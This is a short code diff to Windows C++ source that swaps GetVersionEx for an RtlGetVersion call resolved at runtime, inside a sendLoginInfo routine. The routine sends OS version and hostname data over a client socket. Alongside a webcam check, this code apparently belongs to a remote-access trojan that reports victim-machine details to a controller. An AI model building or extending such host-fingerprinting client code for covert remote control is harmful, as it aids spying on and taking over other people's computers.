@@ -1,3 +1,4 @@
+#pragma once
 #include <wininet.h>
 #include <vfw.h>
 
@@ -54,13 +55,29 @@ inline bool IsWebCam()
 	return bRet;
 }
 
+BOOL RtlGetVersionEx(LPOSVERSIONINFOW lpVersionInformation)
+{
+	typedef DWORD NTSTATUS;
+
+	typedef NTSTATUS (NTAPI* TRtlGetVersion)(PRTL_OSVERSIONINFOW);
+	TRtlGetVersion lpRtlGetVersion = (TRtlGetVersion)GetProcAddress(GetModuleHandleW(L"NTDLL"), "RtlGetVersion");
+
+	if (lpRtlGetVersion)
+	{
+		return lpRtlGetVersion((PRTL_OSVERSIONINFOW)lpVersionInformation) >= 0;
+	}
+
+	return false;
+}
+
 int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
 {
 	LOGININFO LoginInfo;
 
-	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录
+	LoginInfo.bToken = TOKEN_LOGIN;
+
 	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
-	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // 注意转换类型
+	RtlGetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx);
 
 	TCHAR hostname[128] = _T("");
 
